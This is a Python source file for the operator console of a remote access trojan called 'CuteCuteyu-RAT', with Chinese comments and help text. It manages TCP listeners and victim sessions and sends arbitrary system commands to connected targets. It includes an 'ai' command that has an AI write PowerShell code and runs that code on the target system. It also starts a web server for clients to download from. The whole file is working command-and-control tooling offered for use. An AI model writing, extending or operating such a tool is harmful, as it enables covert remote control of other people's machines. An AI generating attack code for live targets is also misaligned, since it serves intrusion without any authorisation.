import socket
import threading
import json
import sys
import time
import re
import platform
from tab_completer import TabCompleter, SessionState
from session import Session
import ps
from webserver import WebServerManager


class CuteCuteyuRatTerminal:
    """CuteCuteyu-RAT风格终端主类"""
    
    def __init__(self):
        self.current_state = SessionState.MAIN
        self.current_session = None
        self.sessions = {}
        self.next_session_id = 1
        
        # 监听器管理 - 支持多个监听器
        self.listeners = {}  # {listener_id: {thread, host, port, is_running}}
        self.next_listener_id = 1
        
        # Web服务器管理（已移至webserver模块）
        self.webserver_manager = WebServerManager()
        
        # 初始化Tab键自动补全
        self.tab_completer = TabCompleter()
        self.setup_tab_completion()
        
    def setup_tab_completion(self):
        """设置Tab键自动补全"""
        # Windows兼容的Tab键自动补全
        try:
            import readline
        except ImportError:
            # Windows系统使用pyreadline3
            import pyreadline3 as readline
        
        def tab_completer(text, state):
            return self.tab_completer.get_completions(text, state, self.current_state, self)
        
        # 设置readline的补全函数
        readline.set_completer(tab_completer)
        
        # 设置Tab键补全模式
        readline.parse_and_bind("tab: complete")
        
        # 设置补全显示样式
        readline.set_completer_delims(' \t\n`~!@#$%^&*()-=+[{]}\\|;:\'\",<>/?')  # 排除特殊字符
        
        # 启用单词补全
        readline.parse_and_bind("set completion-ignore-case on")
        
        print("[+] Tab键自动补全功能已启用")

    def print_banner(self):
        """打印程序横幅"""
        banner = """
╔══════════════════════════════════════════════════════════════╗
║                    CuteCuteyu-RAT - Remote Command Terminal    ║
║                    TCP Remote Command Execution             ║
╚══════════════════════════════════════════════════════════════╝
        """
        print(banner)
    
    def get_prompt(self):
        """获取当前状态的提示符"""
        if self.current_state == SessionState.MAIN:
            return "rat> "
        elif self.current_state == SessionState.SESSION:
            return f"session {self.current_session.session_id}> "
    
    def parse_listen_command(self, command):
        """解析listen命令"""
        parts = command.split()
        if len(parts) == 1:
            return "localhost", 8888
        elif len(parts) == 3:
            return parts[1], int(parts[2])
        else:
            return None, None
    
    def start_listener(self, host, port):
        """启动监听器"""
        listener_id = self.next_listener_id
        self.next_listener_id += 1
        
        def listener_thread(listener_id):
            try:
                server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                server_socket.bind((host, port))
                server_socket.listen(5)
                server_socket.settimeout(1)  # 设置超时以便检查停止标志
                
                print(f"[+] 监听器 {listener_id} 启动在 {host}:{port}")
                
                while self.listeners[listener_id]['is_running']:
                    try:
                        client_socket, client_address = server_socket.accept()
                        print(f"[+] 新会话建立: {client_address}")
                        
                        # 创建新会话
                        session_id = self.next_session_id
                        session = Session(session_id, client_socket, client_address)
                        self.sessions[session_id] = session
                        self.next_session_id += 1
                        
                        # 启动会话处理线程
                        session_thread = threading.Thread(
                            target=self.handle_session,
                            args=(session,)
                        )
                        session_thread.daemon = True
                        session_thread.start()
                        
                    except socket.timeout:
                        continue
                    except Exception as e:
                        if self.listeners[listener_id]['is_running']:
                            print(f"[-] 监听器 {listener_id} 错误: {e}")
                        break
                
                server_socket.close()
                print(f"[-] 监听器 {listener_id} 已停止")
                
            except Exception as e:
                print(f"[-] 监听器 {listener_id} 启动失败: {e}")
        
        # 创建监听器线程
        thread = threading.Thread(target=listener_thread, args=(listener_id,))
        thread.daemon = True
        
        # 保存监听器信息
        self.listeners[listener_id] = {
            'thread': thread,
            'host': host,
            'port': port,
            'is_running': True
        }
        
        thread.start()
        return listener_id
    
    def handle_session(self, session):
        """处理会话通信"""
        try:
            # 发送连接成功消息
            session.send_command("echo 'Session established'")
            
            while session.is_active:
                response = session.receive_response()
                if response and response.get('type') == 'command_result':
                    # 如果有当前会话在交互，显示结果
                    if self.current_state == SessionState.SESSION and self.current_session == session:
                        print(f"\n[+] 命令结果:\n{response.get('result', 'N/A')}\n")
                        print(self.get_prompt(), end="", flush=True)
                
                time.sleep(0.1)
                
        except Exception as e:
            session.is_active = False
        finally:
            if session.session_id in self.sessions:
                del self.sessions[session.session_id]
            print(f"[-] 会话 {session.session_id} 已断开")
    
    def show_sessions(self):
        """显示所有会话"""
        if not self.sessions:
            print("[-] 没有活跃会话")
            return
        
        print("\n活跃会话:")
        print("ID\t地址\t\t状态")
        print("-" * 40)
        for session_id, session in self.sessions.items():
            status = "活跃" if session.is_active else "断开"
            print(f"{session_id}\t{session.client_address}\t{status}")
        print()
    
    def show_jobs(self):
        """显示所有监听器"""
        # 清理已停止的监听器记录
        stopped_listeners = [lid for lid, info in self.listeners.items() if not info['is_running']]
        for listener_id in stopped_listeners:
            del self.listeners[listener_id]
        
        # 只显示正在运行的监听器
        running_listeners = [lid for lid, info in self.listeners.items() if info['is_running']]
        if not running_listeners:
            print("[-] 没有运行的监听器")
            return
        
        print("\n运行中的监听器:")
        print("ID\t主机\t\t端口\t状态")
        print("-" * 50)
        for listener_id in running_listeners:
            listener_info = self.listeners[listener_id]
            print(f"{listener_id}\t{listener_info['host']}\t{listener_info['port']}\t运行中")
        print()
    
    def stop_listener(self, listener_id):
        """停止指定监听器"""
        if listener_id not in self.listeners:
            print(f"[-] 监听器 {listener_id} 不存在")
            return False
        
        if not self.listeners[listener_id]['is_running']:
            print(f"[-] 监听器 {listener_id} 已经停止")
            return False
        
        # 停止监听器
        self.listeners[listener_id]['is_running'] = False
        print(f"[+] 监听器 {listener_id} 正在停止...")
        return True
    

    
    def kill_session(self, session_id):
        """断开指定会话连接"""
        if session_id not in self.sessions:
            print(f"[-] 会话 {session_id} 不存在")
            return False
        
        session = self.sessions[session_id]
        
        # 检查是否是当前活跃会话
        if self.current_state == SessionState.SESSION and self.current_session == session:
            print(f"[+] 断开会话 {session_id} 连接")
            # 如果当前正在该会话中，先退出会话模式
            self.background_session()
        
        # 断开会话连接
        if session.disconnect():
            # 从会话列表中移除
            if session_id in self.sessions:
                del self.sessions[session_id]
            print(f"[+] 会话 {session_id} 已断开")
            return True
        else:
            print(f"[-] 断开会话 {session_id} 失败")
            return False
    
    def enter_session(self, session_id):
        """进入会话交互模式"""
        if session_id not in self.sessions:
            print(f"[-] 会话 {session_id} 不存在")
            return False
        
        session = self.sessions[session_id]
        if not session.is_active:
            print(f"[-] 会话 {session_id} 已断开")
            return False
        
        self.current_state = SessionState.SESSION
        self.current_session = session
        print(f"[+] 进入会话 {session_id} ({session.client_address})")
        print("[+] 输入 'background' 返回主界面\n")
        return True
    
    def background_session(self):
        """退出会话交互模式"""
        if self.current_state == SessionState.SESSION:
            print(f"[+] 会话 {self.current_session.session_id} 已后台运行")
            self.current_state = SessionState.MAIN
            self.current_session = None
    
    def handle_ai_command(self, query):
        """处理AI命令"""
        if not self.current_session or not self.current_session.is_active:
            print("[-] 当前会话已断开")
            self.background_session()
            return False
        
        try:
            print(f"[+] 正在向AI查询: {query}")
            
            # 调用AI生成PowerShell代码
            ai_response = ps.query(query)
            
            # 检查AI响应是否包含有效的PowerShell代码
            if not ai_response or len(ai_response.strip()) == 0:
                print("[-] AI未返回有效代码")
                return False
            
            print(f"[+] AI生成的PowerShell代码:\n{ai_response}")
            
            # 将AI生成的代码发送到客户端执行
            # 使用特殊标记标识这是AI生成的代码
            ai_command = f"ai_execute {ai_response}"
            
            # 发送命令（不等待结果，由后台线程处理）
            if self.current_session.send_command(ai_command):
                print("[+] AI命令已发送到目标系统，结果将在后台显示")
                return True
            else:
                print("[-] 发送AI命令失败")
                return False
            
        except Exception as e:
            print(f"[-] AI命令处理失败: {e}")
            return False
    
    def execute_session_command(self, command):
        """在会话中执行命令"""
        if command.lower() == 'background':
            self.background_session()
            return True
        
        # 处理exit命令 - 断开会话连接
        if command.lower() == 'exit':
            if self.current_session and self.current_session.is_active:
                print(f"[+] 断开会话 {self.current_session.session_id} 连接")
                try:
                    self.current_session.client_socket.close()
                except:
                    pass
                # 从会话列表中移除
                if self.current_session.session_id in self.sessions:
                    del self.sessions[self.current_session.session_id]
            self.background_session()
            return True
        
        # 处理AI命令
        if command.lower().startswith('ai '):
            if len(command) > 3:
                ai_query = command[3:].strip()
                return self.handle_ai_command(ai_query)
            else:
                print("[-] 用法: ai <查询内容>")
                return False
        
        if self.current_session and self.current_session.is_active:
            return self.current_session.send_command(command)
        else:
            print("[-] 当前会话已断开")
            self.background_session()
            return False
    
    def show_help(self):
        """显示帮助信息"""
        help_text = """
可用命令:

全局命令:
  listen [host] [port]    - 启动监听器 (默认: localhost 8888)
  sessions                - 显示所有会话
  sessions -k <id>        - 断开指定会话连接
  session <id>            - 进入指定会话
  jobs                    - 显示所有监听器
  jobs -k <id>            - 停止指定监听器
  webserver               - 启动Web服务器
  webserver -k <id>       - 停止指定Web服务器
  stop                    - 停止所有监听器
  help                    - 显示此帮助信息
  exit                    - 退出程序

会话命令 (在session模式下):
  <任意系统命令>          - 在目标上执行命令
  background              - 返回主界面
  exit                    - 断开会话连接并返回主界面
  ai <查询内容>           - 使用AI生成PowerShell代码并执行

提示:
  • 支持Tab键自动补全命令和参数
  • 在session模式下，输入命令后按Tab键可补全会话命令
  • 在主界面下，输入部分命令后按Tab键可补全命令和参数
  • AI命令会调用AI生成PowerShell代码并在目标系统上执行
  • Web服务器会在指定目录启动HTTP服务，便于客户端访问
        """
        print(help_text)
    
    def main_loop(self):
        """主循环"""
        self.print_banner()
        print("输入 'help' 查看可用命令\n")
        
        while True:
            try:
                prompt = self.get_prompt()
                command = input(prompt).strip()
                
                if not command:
                    continue
                
                if self.current_state == SessionState.MAIN:
                    self.handle_main_command(command)
                elif self.current_state == SessionState.SESSION:
                    self.execute_session_command(command)
                    
            except KeyboardInterrupt:
                if self.current_state == SessionState.SESSION:
                    print("\n[!] 使用 'background' 返回主界面")
                else:
                    print("\n[!] 使用 'exit' 退出程序")
            except Exception as e:
                print(f"[-] 错误: {e}")
    
    def handle_main_command(self, command):
        """处理主界面命令"""
        if command.lower() == 'exit':
            self.cleanup()
            print("[+] 程序退出")
            sys.exit(0)
        
        elif command.lower() == 'help':
            self.show_help()
        
        elif command.lower().startswith('listen'):
            # 检查端口是否已被占用
            host, port = self.parse_listen_command(command)
            if host is None:
                print("[-] 用法: listen [host] [port]")
                return
            
            # 检查是否已有监听器在相同端口运行
            for listener_id, listener_info in self.listeners.items():
                if listener_info['port'] == port and listener_info['is_running']:
                    print(f"[-] 端口 {port} 已被监听器 {listener_id} 占用")
                    return
            
            self.start_listener(host, port)
        
        elif command.lower() == 'sessions':
            self.show_sessions()
        
        elif command.lower().startswith('sessions -k'):
            parts = command.split()
            if len(parts) == 3 and parts[1] == '-k' and parts[2].isdigit():
                session_id = int(parts[2])
                self.kill_session(session_id)
            else:
                print("[-] 用法: sessions -k <session_id>")
        
        elif command.lower().startswith('session'):
            parts = command.split()
            if len(parts) == 2 and parts[1].isdigit():
                session_id = int(parts[1])
                self.enter_session(session_id)
            else:
                print("[-] 用法: session <id>")
        
        elif command.lower() == 'stop':
            # 停止所有监听器
            running_listeners = [lid for lid, info in self.listeners.items() if info['is_running']]
            if running_listeners:
                for listener_id in running_listeners:
                    self.listeners[listener_id]['is_running'] = False
                print("[+] 所有监听器正在停止...")
            else:
                print("[-] 没有运行的监听器")
        
        elif command.lower() == 'jobs':
            self.show_jobs()
        
        elif command.lower().startswith('jobs -k'):
            parts = command.split()
            if len(parts) == 3 and parts[1] == '-k' and parts[2].isdigit():
                listener_id = int(parts[2])
                self.stop_listener(listener_id)
            else:
                print("[-] 用法: jobs -k <listener_id>")
        
        elif command.lower() == 'webservers':
            self.webserver_manager.show_webservers()
        
        elif command.lower() == 'webserver':
            # 启动Web服务器
            webserver_id = self.webserver_manager.start_webserver()
            if webserver_id:
                print(f"[+] Web服务器 {webserver_id} 启动成功")
            else:
                print("[-] Web服务器启动失败")
        
        elif command.lower().startswith('webserver -k'):
            parts = command.split()
            if len(parts) == 3 and parts[1] == '-k' and parts[2].isdigit():
                webserver_id = int(parts[2])
                self.webserver_manager.stop_webserver(webserver_id)
            else:
                print("[-] 用法: webserver -k <webserver_id>")
        
        else:
            print(f"[-] 未知命令: {command}")
            print("   输入 'help' 查看可用命令")
    
    def cleanup(self):
        """清理资源"""
        # 关闭所有会话
        for session in self.sessions.values():
            try:
                session.client_socket.close()
            except:
                pass